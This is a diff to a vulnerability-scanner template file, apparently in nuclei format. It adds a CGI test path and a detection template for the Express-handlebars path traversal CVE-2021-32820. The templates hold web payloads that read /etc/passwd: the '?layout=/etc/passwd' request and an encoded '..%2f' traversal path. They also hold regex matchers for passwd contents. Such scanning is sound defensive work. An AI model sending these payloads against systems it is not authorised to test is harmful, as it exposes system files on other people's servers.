@@ -1896,7 +1896,8 @@
             "{{BaseURL}}/cgi-bin/test",
             "{{BaseURL}}/cgi-bin/status/status.cgi",
             "{{BaseURL}}/test.cgi",
-            "{{BaseURL}}/debug.cgi"
+            "{{BaseURL}}/debug.cgi",
+            "{{BaseURL}}/cgi-bin/test-cgi"
           ]
         }
       ]
@@ -18321,6 +18322,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-32820",
+      "info": {
+        "author": "dhiyaneshDk",
+        "name": "Express-handlebars Path Traversal",
+        "reference": "- https://securitylab.github.com/advisories/GHSL-2021-018-express-handlebars/\n- https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/CVE-2021-32820.json\n",
+        "severity": "medium",
+        "tags": "cve,cve2021,expressjs,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "or",
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:",
+                "daemon:[x*]:0:0:",
+                "operator:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?layout=/etc/passwd"
           ]
         }
       ]
